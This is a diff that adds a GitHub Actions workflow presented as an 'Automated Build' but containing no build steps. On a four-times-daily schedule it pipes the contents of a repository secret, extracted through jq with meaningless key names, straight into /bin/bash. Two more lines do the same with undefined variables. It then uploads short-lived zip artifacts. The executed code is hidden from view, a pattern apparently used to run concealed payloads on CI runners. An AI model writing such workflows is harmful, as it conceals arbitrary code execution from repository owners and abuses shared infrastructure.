@@ -1,0 +1,35 @@
+name: Automated Build
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '25 3,9,15,21 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  job:
+    name: Go
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Go
+        env:
+          an50: ${{ secrets.an50 }}
+        run: |
+          printf '%s' "$an50" | jq -r .oqvn94859 | /bin/bash
+          printf '%s' "$a2553" | jq -r .y98748 | /bin/bash
+          echo $s8 | jq -r .wn3493 | /bin/bash
+
+      - name: Store artifact
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: 7WcHFgSx
+          path: "*.zip"
+          retention-days: 1
